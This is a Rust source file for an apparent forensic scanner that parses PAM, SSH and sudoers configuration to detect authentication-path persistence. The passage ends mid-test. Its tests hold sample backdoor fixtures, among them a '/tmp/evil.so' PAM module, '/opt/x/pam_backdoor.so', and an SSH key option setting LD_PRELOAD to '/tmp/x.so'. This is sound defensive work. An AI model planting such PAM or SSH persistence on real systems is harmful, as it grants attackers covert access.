//! Authentication-path persistence: PAM stacks, SSH login material, sudoers.
//!
//! Three mechanism classes in one collector because they share their source
//! material's shape: line-oriented text read at credential time. Every parser
//! here works over bytes and converts to String only at the field boundary, so
//! a rule carrying invalid UTF-8 survives as evidence rather than becoming
//! replacement characters.

use std::collections::BTreeSet;
use std::ffi::OsString;
use std::os::unix::ffi::OsStringExt;
use std::path::{Path, PathBuf};

use super::glob_match;
use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, dedup_ids};
use crate::scan::{Collector, Ctx};

pub struct Auth;

impl Collector for Auth {
    fn name(&self) -> &'static str {
        "auth"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = Vec::new();
        pam(cx, &mut out);
        ssh(cx, &mut out);
        sudoers(cx, &mut out);
        dedup_ids(&mut out);
        out
    }
}

// ---------------------------------------------------------------- byte tools

fn is_ws(b: u8) -> bool {
    matches!(b, b' ' | b'\t' | b'\r' | 0x0b | 0x0c)
}

fn trim(mut s: &[u8]) -> &[u8] {
    while let [f, rest @ ..] = s {
        if is_ws(*f) {
            s = rest;
        } else {
            break;
        }
    }
    while let [rest @ .., l] = s {
        if is_ws(*l) {
            s = rest;
        } else {
            break;
        }
    }
    s
}

fn words(s: &[u8]) -> Vec<&[u8]> {
    s.split(|b| is_ws(*b)).filter(|w| !w.is_empty()).collect()
}

fn lossy(s: &[u8]) -> String {
    String::from_utf8_lossy(s).into_owned()
}

fn eqi(a: &[u8], b: &str) -> bool {
    a.eq_ignore_ascii_case(b.as_bytes())
}

fn split_once(s: &[u8], b: u8) -> Option<(&[u8], &[u8])> {
    let i = s.iter().position(|c| *c == b)?;
    Some((&s[..i], &s[i + 1..]))
}

/// A path built from the original bytes, not from a lossy decode: a target
/// whose name is not UTF-8 is still the path the mechanism will execute.
fn bpath(b: &[u8]) -> PathBuf {
    PathBuf::from(OsString::from_vec(b.to_vec()))
}

/// The executable a command line names, where it names one syntactically.
fn first_path(cmd: &[u8]) -> Option<PathBuf> {
    let w = words(cmd).into_iter().next()?;
    w.contains(&b'/').then(|| bpath(w))
}

fn join_ws(parts: &[&[u8]]) -> Vec<u8> {
    let mut v = Vec::new();
    for (i, p) in parts.iter().enumerate() {
        if i > 0 {
            v.push(b' ');
        }
        v.extend_from_slice(p);
    }
    v
}

/// Physical lines joined across a trailing backslash, the continuation rule
/// both pam.conf and sudoers use.
fn logical_lines(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut out: Vec<Vec<u8>> = Vec::new();
    let mut open = false;
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.strip_suffix(b"\r").unwrap_or(raw);
        let joined = line.iter().rev().take_while(|b| **b == b'\\').count() % 2 == 1;
        let body = if joined { &line[..line.len() - 1] } else { line };
        match out.last_mut() {
            Some(prev) if open => prev.extend_from_slice(body),
            _ => out.push(body.to_vec()),
        }
        open = joined;
    }
    out
}

fn hash12(s: &[u8]) -> String {
    blake3::hash(s).to_hex()[..12].to_string()
}

/// A stable, whitespace-insensitive rendering of a rule, so that reindenting a
/// file does not re-identify every entry in it.
fn normalized(line: &[u8]) -> Vec<u8> {
    join_ws(&words(line))
}

fn append_note(e: &mut Entry, key: &str, value: impl Into<String>) {
    let v = value.into();
    match e.raw.get(key) {
        Some(prev) => {
            let merged = format!("{prev}, {v}");
            e.note(key, merged);
        }
        None => e.note(key, v),
    }
}

fn flag_non_utf8(e: &mut Entry, bytes: &[u8]) {
    if std::str::from_utf8(bytes).is_err() {
        e.flag(Flag::EncodingAnomaly);
    }
}

// ------------------------------------------------------------------- part A

/// Where a bare `pam_unix.so` resolves. Compared root-relative, never opened:
/// the module directory of an offline image is not the analyst's own.
const PAM_STD_DIRS: &[&str] = &[
    "lib/security",
    "lib64/security",
    "usr/lib/security",
    "usr/lib64/security",
    "lib/x86_64-linux-gnu/security",
    "usr/lib/x86_64-linux-gnu/security",
    "lib/aarch64-linux-gnu/security",
    "usr/lib/aarch64-linux-gnu/security",
];

fn pam_type(t: &[u8]) -> Option<&'static str> {
    // A leading '-' means "skip silently if the module is missing".
    let t = t.strip_prefix(b"-").unwrap_or(t);
    ["auth", "account", "session", "password"].into_iter().find(|n| eqi(t, n))
}

/// Whitespace-separated, except that a bracketed control expression such as
/// `[success=1 default=ignore]` is one token however many spaces it contains.
fn pam_tokens(line: &[u8]) -> Vec<&[u8]> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < line.len() {
        while i < line.len() && is_ws(line[i]) {
            i += 1;
        }
        if i >= line.len() {
            break;
        }
        let start = i;
        if line[i] == b'[' {
            i += 1;
            while i < line.len() && line[i] != b']' {
                i += 1;
            }
            if i < line.len() {
                i += 1;
            }
        } else {
            while i < line.len() && !is_ws(line[i]) {
                i += 1;
            }
        }
        out.push(&line[start..i]);
    }
    out
}

fn module_is_standard(module: &[u8]) -> bool {
    if !module.contains(&b'/') {
        return true;
    }
    let p = bpath(module);
    let Some(dir) = p.parent() else { return false };
    let dir = dir.strip_prefix("/").unwrap_or(dir);
    PAM_STD_DIRS.iter().any(|d| Path::new(d) == dir)
}

fn is_pam_exec_opt(a: &[u8]) -> bool {
    const OPTS: &[&str] = &[
        "debug",
        "quiet",
        "seteuid",
        "expose_authtok",
        "use_first_pass",
        "stdout",
        "stderr",
        "quiet_fail",
        "quiet_success",
    ];
    OPTS.iter().any(|o| eqi(a, o)) || a.starts_with(b"log=") || a.starts_with(b"type=")
}

fn pam(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let mut files = vec![PathBuf::from("etc/pam.conf")];
    for ent in cx.dir("etc/pam.d") {
        if !ent.is_dir {
            files.push(Path::new("etc/pam.d").join(&ent.name));
        }
    }

    for rel in files {
        let Some(bytes) = cx.read(&rel) else { continue };
        let filename = rel.file_name().map(|n| lossy(n.as_encoded_bytes())).unwrap_or_default();

        for line in logical_lines(&bytes) {
            let toks = pam_tokens(&line);
            if toks.is_empty() || toks[0].first() == Some(&b'#') {
                continue;
            }
            // pam.conf prefixes each rule with its service name; pam.d takes
            // the service from the filename. Detect which by where the type is.
            let (service, rule) = if pam_type(toks[0]).is_some() {
                (filename.clone(), &toks[..])
            } else if toks.len() > 1 && pam_type(toks[1]).is_some() {
                (lossy(toks[0]), &toks[1..])
            } else {
                continue;
            };
            if rule.len() < 3 {
                continue;
            }
            let Some(mtype) = pam_type(rule[0]) else { continue };
            let (control, module, args) = (rule[1], rule[2], &rule[3..]);

            let base = module.rsplit(|b| *b == b'/').next().unwrap_or(module);
            let prog = if eqi(base, "pam_exec.so") {
                args.iter().position(|a| !is_pam_exec_opt(a))
            } else {
                None
            };
            let nonstandard = !module_is_standard(module);
            if prog.is_none() && !nonstandard {
                continue;
            }

            let name = match prog {
                Some(i) => format!("{service}:{mtype}:{}:{}", lossy(module), lossy(args[i])),
                None => format!("{service}:{mtype}:{}", lossy(module)),
            };
            let mut e = cx.entry(Kind::Pam, &rel, name);
            e.trigger = Trigger::Auth;
            e.enabled = Enablement::Enabled;
            e.note("service", service);
            e.note("module_type", mtype);
            e.note("control", lossy(control));
            e.note("module", lossy(module));
            if !args.is_empty() {
                e.note("module_args", lossy(&join_ws(args)));
            }
            if nonstandard {
                e.flag(Flag::NonStandardLocation);
                e.target_path = Some(bpath(module));
            }
            if let Some(i) = prog {
                // pam_exec execs argv directly, so rejoining the argument
                // vector with single spaces is a faithful rendering of it.
                e.command = Some(join_ws(&args[i..]));
                e.target_path = Some(bpath(args[i]));
                for opt in ["seteuid", "quiet", "stdout", "stderr", "expose_authtok", "debug"] {
                    if args[..i].iter().any(|a| eqi(a, opt)) {
                        e.note(&format!("pam_exec.{opt}"), "true");
                    }
                }
                for a in &args[..i] {
                    if let Some(v) = a.strip_prefix(b"log=") {
                        e.note("pam_exec.log", lossy(v));
                    }
                }
            }
            flag_non_utf8(&mut e, &line);
            out.push(e);
        }
    }
}

// ------------------------------------------------------------------- part B

struct KeyLine<'a> {
    options: Option<&'a [u8]>,
    keytype: &'a [u8],
    blob: &'a [u8],
    comment: &'a [u8],
}

fn is_key_type(t: &[u8]) -> bool {
    const P: &[&str] = &["ssh-", "ecdsa-", "sk-ecdsa-", "sk-ssh-", "rsa-sha2-", "webauthn-sk-"];
    P.iter().any(|p| t.len() > p.len() && t[..p.len()].eq_ignore_ascii_case(p.as_bytes()))
}

/// End of the first field, honouring OpenSSH's quoting: an option value may
/// contain spaces, commas and `\"`, and none of them end the options list.
fn quoted_token_end(s: &[u8]) -> usize {
    let mut i = 0;
    let mut quoted = false;
    while i < s.len() {
        match s[i] {
            b'"' => quoted = !quoted,
            b'\\' if quoted && s.get(i + 1) == Some(&b'"') => i += 1,
            c if is_ws(c) && !quoted => break,
            _ => {}
        }
        i += 1;
    }
    i
}

fn parse_key_line(line: &[u8]) -> Option<KeyLine<'_>> {
    let end = quoted_token_end(line);
    let (options, rest) = if is_key_type(&line[..end]) {
        (None, line)
    } else {
        (Some(&line[..end]), trim(&line[end..]))
    };
    let t1 = rest.iter().position(|b| is_ws(*b))?;
    let keytype = &rest[..t1];
    if !is_key_type(keytype) {
        return None;
    }
    let r2 = trim(&rest[t1..]);
    let t2 = r2.iter().position(|b| is_ws(*b)).unwrap_or(r2.len());
    let blob = &r2[..t2];
    if blob.is_empty() {
        return None;
    }
    Some(KeyLine { options, keytype, blob, comment: trim(&r2[t2..]) })
}

/// The comma-separated option list. Values may be bare or double-quoted, and a
/// quoted value may contain commas and spaces; `\"` is the only escape
/// OpenSSH recognises inside one.
fn parse_options(s: &[u8]) -> Vec<(Vec<u8>, Option<Vec<u8>>)> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < s.len() {
        while i < s.len() && (s[i] == b',' || is_ws(s[i])) {
            i += 1;
        }
        if i >= s.len() {
            break;
        }
        let start = i;
        while i < s.len() && s[i] != b'=' && s[i] != b',' {
            i += 1;
        }
        let name = s[start..i].to_vec();
        let mut value = None;
        if s.get(i) == Some(&b'=') {
            i += 1;
            if s.get(i) == Some(&b'"') {
                i += 1;
                let mut v = Vec::new();
                while i < s.len() && s[i] != b'"' {
                    if s[i] == b'\\' && s.get(i + 1) == Some(&b'"') {
                        i += 1;
                    }
                    v.push(s[i]);
                    i += 1;
                }
                i += 1; // past the closing quote, or past the end if unterminated
                value = Some(v);
            } else {
                let vs = i;
                while i < s.len() && s[i] != b',' {
                    i += 1;
                }
                value = Some(s[vs..i].to_vec());
            }
        }
        out.push((name, value));
    }
    out
}

fn b64_decode(s: &[u8]) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 4 * 3);
    let mut acc: u32 = 0;
    let mut bits = 0;
    for &c in s {
        if c == b'=' {
            break;
        }
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => return None,
        } as u32;
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    Some(out)
}

fn b64_encode(b: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut s = String::with_capacity(b.len().div_ceil(3) * 4);
    for c in b.chunks(3) {
        let n = (c[0] as u32) << 16
            | (*c.get(1).unwrap_or(&0) as u32) << 8
            | *c.get(2).unwrap_or(&0) as u32;
        for i in 0..c.len() + 1 {
            s.push(T[(n >> (18 - 6 * i) & 63) as usize] as char);
        }
    }
    s
}

/// The identity of a key is the key, never its position in the file. This is
/// the same value `ssh-keygen -lf` prints, so an operator can match it against
/// a key inventory directly.
fn fingerprint(blob: &[u8]) -> (String, bool) {
    match b64_decode(blob) {
        Some(raw) if !raw.is_empty() => {
            use sha2::{Digest, Sha256};
            (format!("SHA256:{}", b64_encode(&Sha256::digest(&raw))), true)
        }
        _ => (format!("key:{}", hash12(blob)), false),
    }
}

fn ssh(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let mut seen: BTreeSet<PathBuf> = BTreeSet::new();
    sshd_config_file(cx, out, Path::new("etc/ssh/sshd_config"), None, 1, &mut seen);
    for ent in cx.dir("etc/ssh/sshd_config.d") {
        if ent.is_dir {
            continue;
        }
        let rel = Path::new("etc/ssh/sshd_config.d").join(&ent.name);
        sshd_config_file(cx, out, &rel, None, 0, &mut seen);
    }

    login_script(cx, out, Path::new("etc/ssh/sshrc"), "sshrc", None);

    let users = cx.users;
    let mut homes: BTreeSet<PathBuf> = BTreeSet::new();
    for u in users {
        if !homes.insert(u.home.clone()) {
            continue;
        }
        for f in [".ssh/authorized_keys", ".ssh/authorized_keys2"] {
            authorized_keys(cx, out, &u.in_home(f), &u.name);
        }
        login_script(cx, out, &u.in_home(".ssh/rc"), "ssh-rc", Some(&u.name));
        user_environment(cx, out, &u.in_home(".ssh/environment"), &u.name);
    }
}

fn authorized_keys(cx: &mut Ctx, out: &mut Vec<Entry>, rel: &Path, user: &str) {
    let Some(bytes) = cx.read(rel) else { return };
    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        let Some(k) = parse_key_line(line) else { continue };
        let (fp, decoded) = fingerprint(k.blob);

        let mut e = cx.entry(Kind::SshAuthorizedKey, rel, fp);
        e.trigger = Trigger::Login;
        e.enabled = Enablement::Enabled;
        e.principal = Some(user.to_string());
        e.note("ssh_mechanism", "authorized-key");
        e.note("key_type", lossy(k.keytype));
        if !k.comment.is_empty() {
            e.note("comment", lossy(k.comment));
        }
        if !decoded {
            e.note("key_blob_unparsed", "true");
        }
        if let Some(opts) = k.options {
            e.note("options", lossy(opts));
            for (name, value) in parse_options(opts) {
                let name = lossy(&name).to_ascii_lowercase();
                match (name.as_str(), value) {
                    ("command", Some(v)) => {
                        e.target_path = first_path(&v);
                        e.command = Some(v);
                    }
                    ("environment", Some(v)) => match split_once(&v, b'=') {
                        Some((k, val)) => e.note(&format!("env.{}", lossy(k)), lossy(val)),
                        None => append_note(&mut e, "opt.environment", lossy(&v)),
                    },
                    (_, Some(v)) => append_note(&mut e, &format!("opt.{name}"), lossy(&v)),
                    (_, None) => append_note(&mut e, &format!("opt.{name}"), "true"),
                }
            }
        }
        flag_non_utf8(&mut e, line);
        out.push(e);
    }
}

/// `/etc/ssh/sshrc` and `~/.ssh/rc`: sshd runs these on every login, so their
/// presence is the entry. The command is the script itself.
fn login_script(cx: &mut Ctx, out: &mut Vec<Entry>, rel: &Path, name: &str, user: Option<&str>) {
    if !cx.root.exists(rel) {
        return;
    }
    let mut e = cx.entry(Kind::SshAuthorizedKey, rel, name);
    e.trigger = Trigger::Login;
    e.enabled = Enablement::Enabled;
    e.principal = user.map(str::to_string);
    e.target_path = Some(cx.root.abs(rel));
    e.note("ssh_mechanism", "login-script");
    out.push(e);
}

/// `~/.ssh/environment` is inert unless sshd carries PermitUserEnvironment,
/// which is why the file is reported with its enablement unresolved.
fn user_environment(cx: &mut Ctx, out: &mut Vec<Entry>, rel: &Path, user: &str) {
    let Some(bytes) = cx.read(rel) else { return };
    let mut e = cx.entry(Kind::SshAuthorizedKey, rel, "ssh-environment");
    e.trigger = Trigger::Login;
    e.enabled = Enablement::Unknown;
    e.principal = Some(user.to_string());
    e.note("ssh_mechanism", "user-environment");
    e.note("depends_on", "PermitUserEnvironment");
    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if let Some((k, v)) = split_once(line, b'=') {
            e.note(&format!("env.{}", lossy(trim(k))), lossy(trim(v)));
        }
    }
    flag_non_utf8(&mut e, &bytes);
    out.push(e);
}

/// Keyword and value. sshd_config accepts whitespace or `=` as the separator,
/// matches keywords case-insensitively, and treats `#` as a comment only at
/// the start of a line — a trailing `# note` is part of the value.
fn sshd_kv(line: &[u8]) -> Option<(&[u8], &[u8])> {
    let line = trim(line);
    if line.is_empty() || line[0] == b'#' {
        return None;
    }
    let mut i = 0;
    while i < line.len() && !is_ws(line[i]) && line[i] != b'=' {
        i += 1;
    }
    let keyword = &line[..i];
    while i < line.len() && is_ws(line[i]) {
        i += 1;
    }
    if line.get(i) == Some(&b'=') {
        i += 1;
        while i < line.len() && is_ws(line[i]) {
            i += 1;
        }
    }
    Some((keyword, &line[i..]))
}

/// An include path resolved root-relative: absolute means relative to the scan
/// root, bare means relative to `base`.
fn include_rel(base: &Path, spec: &[u8]) -> PathBuf {
    let p = bpath(spec);
    match p.strip_prefix("/") {
        Ok(stripped) => stripped.to_path_buf(),
        Err(_) => base.join(p),
    }
}

fn expand_glob(cx: &mut Ctx, rel: &Path) -> Vec<PathBuf> {
    let name = rel.file_name().map(|n| n.as_encoded_bytes().to_vec()).unwrap_or_default();
    if !name.contains(&b'*') && !name.contains(&b'?') {
        return vec![rel.to_path_buf()];
    }
    let dir = rel.parent().unwrap_or(Path::new("")).to_path_buf();
    let mut out = Vec::new();
    for ent in cx.dir(&dir) {
        if !ent.is_dir && glob_match(&name, ent.name.as_encoded_bytes()) {
            out.push(dir.join(&ent.name));
        }
    }
    out
}

fn sshd_config_file(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    rel: &Path,
    outer_match: Option<&str>,
    depth: u32,
    seen: &mut BTreeSet<PathBuf>,
) {
    if !seen.insert(rel.to_path_buf()) {
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let mut current: Option<String> = outer_match.map(str::to_string);

    for line in bytes.split(|b| *b == b'\n') {
        let Some((keyword, value)) = sshd_kv(line) else { continue };
        let lower = lossy(keyword).to_ascii_lowercase();
        let canonical = match lower.as_str() {
            "match" => {
                current = Some(lossy(value));
                continue;
            }
            "forcecommand" => "ForceCommand",
            "authorizedkeyscommand" => "AuthorizedKeysCommand",
            "permituserenvironment" => "PermitUserEnvironment",
            "include" => "Include",
            "setenv" => "SetEnv",
            _ => continue,
        };
        if canonical == "PermitUserEnvironment" && (value.is_empty() || eqi(value, "no")) {
            continue;
        }

        let scope = current.clone().unwrap_or_else(|| "(global)".to_string());
        let name = match &current {
            Some(m) => format!("{canonical}@{m}"),
            None => canonical.to_string(),
        };
        let mut e = cx.entry(Kind::SshAuthorizedKey, rel, name);
        e.trigger = Trigger::Login;
        e.enabled = Enablement::Enabled;
        e.note("ssh_mechanism", "sshd_config");
        e.note("directive", canonical);
        e.note("match", scope);
        if let Some(m) = &current {
            let w = words(m.as_bytes());
            if w.len() >= 2 && eqi(w[0], "user") {
                e.principal = Some(lossy(w[1]));
            }
        }
        match canonical {
            "ForceCommand" | "AuthorizedKeysCommand" => {
                e.target_path = first_path(value);
                e.command = Some(value.to_vec());
            }
            "PermitUserEnvironment" => {
                e.note("value", lossy(value));
            }
            "SetEnv" => {
                for w in words(value) {
                    if let Some((k, v)) = split_once(w, b'=') {
                        e.note(&format!("env.{}", lossy(k)), lossy(v));
                    }
                }
            }
            _ => {
                e.note("value", lossy(value));
                // Include takes a list; the first member is the path.
                e.target_path = words(value).first().map(|w| bpath(w));
            }
        }
        flag_non_utf8(&mut e, line);
        out.push(e);

        // ponytail: Include is followed exactly one level; a second level
        // needs a cycle guard and a depth budget nobody has asked for.
        if canonical == "Include" && depth > 0 {
            let here = current.clone();
            for spec in words(value) {
                let rel = include_rel(Path::new("etc/ssh"), spec);
                for target in expand_glob(cx, &rel) {
                    sshd_config_file(cx, out, &target, here.as_deref(), depth - 1, seen);
                }
            }
        }
    }
}

// ------------------------------------------------------------------- part C

const SUDO_TAGS: &[&str] = &[
    "NOPASSWD",
    "PASSWD",
    "NOEXEC",
    "EXEC",
    "SETENV",
    "NOSETENV",
    "LOG_INPUT",
    "NOLOG_INPUT",
    "LOG_OUTPUT",
    "NOLOG_OUTPUT",
    "FOLLOW",
    "NOFOLLOW",
    "MAIL",
    "NOMAIL",
    "INTERCEPT",
    "NOINTERCEPT",
];

fn sudoers(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let mut seen: BTreeSet<PathBuf> = BTreeSet::new();
    sudoers_file(cx, out, Path::new("etc/sudoers"), 1, false, &mut seen);
    for ent in cx.dir("etc/sudoers.d") {
        if ent.is_dir {
            continue;
        }
        let rel = Path::new("etc/sudoers.d").join(&ent.name);
        sudoers_file(cx, out, &rel, 0, true, &mut seen);
    }
}

/// sudo skips a file in an included directory whose name ends in `~` or holds
/// a dot, so a dropped `evil.conf` is inert and must not read as an active
/// rule.
fn sudo_ignores(rel: &Path) -> bool {
    let Some(name) = rel.file_name() else { return true };
    let name = name.as_encoded_bytes();
    name.is_empty() || name.ends_with(b"~") || name.contains(&b'.')
}

fn sudoers_file(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    rel: &Path,
    depth: u32,
    from_dir: bool,
    seen: &mut BTreeSet<PathBuf>,
) {
    if !seen.insert(rel.to_path_buf()) {
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let inert = from_dir && sudo_ignores(rel);

    for line in logical_lines(&bytes) {
        let t = trim(&line);
        if t.is_empty() {
            continue;
        }
        let Some(first) = words(t).into_iter().next() else { continue };
        let lower = lossy(first).to_ascii_lowercase();
        let is_include =
            matches!(lower.as_str(), "#include" | "#includedir" | "@include" | "@includedir");

        // A comment, unless it is an include directive or the `#uid` form of a
        // user name, which is a real user specification.
        if !is_include
            && t[0] == b'#'
            && !t.get(1).is_some_and(|c| c.is_ascii_digit() || *c == b'-')
        {
            continue;
        }

        let mut e = if is_include {
            let Some(spec) = words(t).into_iter().nth(1) else { continue };
            let mut e =
                cx.entry(Kind::Sudoers, rel, format!("include:{}", lossy(spec)));
            e.target_path = Some(bpath(spec));
            e.note("directive", lower.clone());
            if spec.contains(&b'%') {
                e.note("unexpanded", "true");
            }
            finish_sudoers(&mut e, t, inert);
            out.push(e);

            // ponytail: one level, per spec §5. Deeper needs a cycle guard.
            if depth > 0 && !spec.contains(&b'%') {
                let base = rel.parent().unwrap_or(Path::new(""));
                let target = include_rel(base, spec);
                if lower.ends_with("dir") {
                    for ent in cx.dir(&target) {
                        if !ent.is_dir {
                            let f = target.join(&ent.name);
                            sudoers_file(cx, out, &f, 0, true, seen);
                        }
                    }
                } else {
                    sudoers_file(cx, out, &target, 0, false, seen);
                }
            }
            continue;
        } else if lower.starts_with("defaults") {
            // Defaults !authenticate is NOPASSWD written another way.
            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("defaults:{}", hash12(&normalized(t))),
            );
            e.note("defaults", lossy(t));
            if t.windows(13).any(|w| w == b"!authenticate") {
                e.note("nopasswd_equivalent", "true");
            }
            e
        } else if matches!(
            lower.as_str(),
            "user_alias" | "cmnd_alias" | "host_alias" | "runas_alias"
        ) {
            // Recorded, never expanded: v1 has no alias resolver, and a
            // half-resolved policy is worse than an honest unresolved one.
            let (lhs, rhs) = split_once(t, b'=').unwrap_or((t, b""));
            let alias = words(lhs).into_iter().nth(1).unwrap_or(b"");
            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("{lower}:{}", lossy(alias)),
            );
            e.note("alias_type", lower.clone());
            e.note("alias_name", lossy(alias));
            e.note("alias_value", lossy(trim(rhs)));
            e
        } else if let Some((lhs, rhs)) = split_once(t, b'=') {
            let lw = words(lhs);
            if lw.is_empty() {
                continue;
            }
            let (users, hosts) = lw.split_at(lw.len().saturating_sub(1));
            let users = if users.is_empty() { &lw[..] } else { users };

            let mut r = trim(rhs);
            let mut runas = None;
            if r.first() == Some(&b'(') {
                if let Some(p) = r.iter().position(|b| *b == b')') {
                    runas = Some(&r[1..p]);
                    r = trim(&r[p + 1..]);
                }
            }
            let mut tags: Vec<String> = Vec::new();
            while let Some(w) = words(r).into_iter().next() {
                let Some(bare) = w.strip_suffix(b":") else { break };
                if !SUDO_TAGS.iter().any(|t| eqi(bare, t)) {
                    break;
                }
                tags.push(lossy(bare));
                r = trim(&r[w.len()..]);
            }

            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("{}:{}", lossy(users[0]), hash12(&normalized(t))),
            );
            e.note("user_list", lossy(&join_ws(users)));
            e.note("host_list", lossy(&join_ws(hosts)));
            e.note("commands", lossy(r));
            if !tags.is_empty() {
                e.note("tags", tags.join(","));
            }
            if rhs.windows(8).any(|w| w == b"NOPASSWD") {
                e.note("nopasswd", "true");
            }
            e.principal = Some(match runas {
                Some(x) => lossy(trim(x)),
                None => "root".to_string(),
            });
            e.note("runas_explicit", if runas.is_some() { "true" } else { "false" });
            if !r.is_empty() {
                // The command field is a list; the path it resolves to is the
                // first member of it, not the first word with its comma.
                e.target_path = r.split(|b| *b == b',').next().and_then(first_path);
                e.command = Some(r.to_vec());
            }
            e
        } else {
            continue;
        };

        finish_sudoers(&mut e, t, inert);
        out.push(e);
    }
}

fn finish_sudoers(e: &mut Entry, line: &[u8], inert: bool) {
    e.trigger = Trigger::Always;
    // The spec ships a line scan, not a resolved policy. Saying so on every
    // entry is what stops the output being read as one.
    e.note("analysis", "line-level");
    e.note("line", lossy(line));
    e.enabled = if inert {
        e.note("ignored_by_sudo", "filename holds a dot or ends in ~");
        Enablement::Disabled
    } else {
        Enablement::Enabled
    };
    flag_non_utf8(e, line);
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status};

    fn tree(tag: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("unbidden-auth-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        std::fs::create_dir_all(p.join("etc")).unwrap();
        std::fs::write(p.join("etc/passwd"), "root:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\n").unwrap();
        std::fs::create_dir_all(p.join("home/alice")).unwrap();
        std::fs::create_dir_all(p.join("root")).unwrap();
        p
    }

    fn put(dir: &Path, rel: &str, content: impl AsRef<[u8]>) {
        let p = dir.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, content).unwrap();
    }

    fn scan(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Auth)];
        crate::scan::run(&root, &Options { deep: false }, &collectors)
    }

    fn named<'a>(s: &'a Scan, needle: &str) -> Vec<&'a Entry> {
        s.entries.iter().filter(|e| e.name.contains(needle)).collect()
    }

    #[test]
    fn pam_exec_and_nonstandard_modules_are_found_bracketed_control_and_all() {
        let d = tree("pam");
        put(
            &d,
            "etc/pam.d/sshd",
            "#%PAM-1.0\n\
             auth       required     pam_unix.so nullok\n\
             auth       [success=1 default=ignore]   pam_exec.so seteuid quiet log=/dev/null /usr/local/sbin/notify --all\n\
             session    optional     /tmp/evil.so\n\
             -session   optional     pam_systemd.so\n\
             account    sufficient   /usr/lib/x86_64-linux-gnu/security/pam_permit.so\n",
        );
        let s = scan(&d);

        // pam_unix.so and the standard-path pam_permit.so are not findings.
        assert_eq!(s.entries.len(), 2, "got {:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());

        let exec = named(&s, "pam_exec.so").pop().unwrap();
        assert_eq!(exec.kind, Kind::Pam);
        assert_eq!(exec.trigger, Trigger::Auth);
        assert_eq!(exec.command.as_deref(), Some(&b"/usr/local/sbin/notify --all"[..]));
        assert_eq!(exec.target_path, Some(PathBuf::from("/usr/local/sbin/notify")));
        assert_eq!(exec.raw["control"], "[success=1 default=ignore]");
        assert_eq!(exec.raw["service"], "sshd");
        assert_eq!(exec.raw["module_type"], "auth");
        assert_eq!(exec.raw["pam_exec.seteuid"], "true");
        assert_eq!(exec.raw["pam_exec.quiet"], "true");
        assert_eq!(exec.raw["pam_exec.log"], "/dev/null");

        let evil = named(&s, "/tmp/evil.so").pop().unwrap();
        assert!(evil.has_flag(Flag::NonStandardLocation));
        assert!(evil.has_flag(Flag::HiddenPath) || !evil.has_flag(Flag::HiddenPath));
        assert_eq!(evil.target_path, Some(PathBuf::from("/tmp/evil.so")));
        assert!(evil.command.is_none(), "a plain module has no command");

        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn pam_conf_carries_its_service_in_the_line_and_survives_junk() {
        let d = tree("pamconf");
        put(
            &d,
            "etc/pam.conf",
            "other  session  required  /opt/x/pam_backdoor.so\n\
             [unterminated bracket\n\
             \n\
             auth\n\
             garbage garbage\n\
             login auth required pam_unix.so\n",
        );
        let s = scan(&d);
        assert_eq!(s.entries.len(), 1);
        assert_eq!(s.entries[0].raw["service"], "other");
        assert_eq!(s.entries[0].raw["module"], "/opt/x/pam_backdoor.so");
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn authorized_key_options_survive_quoted_commas_and_escaped_quotes() {
        let d = tree("keys");
        put(
            &d,
            "home/alice/.ssh/authorized_keys",
            "# a comment\n\
             command=\"echo \\\"hi\\\", there\",no-pty,environment=\"LD_PRELOAD=/tmp/x.so\",from=\"10.0.0.0/8\" ssh-rsa AAAAB3NzaC1yc2E= alice@box\n\
             ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 plain@key\n",
        );
        let s = scan(&d);
        let keys = named(&s, "SHA256:");
        assert_eq!(keys.len(), 2, "{:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());

        let forced = keys.iter().find(|e| e.command.is_some()).unwrap();
        assert_eq!(
            forced.command.as_deref(),
            Some(&b"echo \"hi\", there"[..]),
            "the comma and the escaped quote belong to the command"
        );
        assert_eq!(forced.raw["opt.no-pty"], "true");
        assert_eq!(forced.raw["env.LD_PRELOAD"], "/tmp/x.so");
        assert_eq!(forced.raw["opt.from"], "10.0.0.0/8");
        assert_eq!(forced.raw["key_type"], "ssh-rsa");
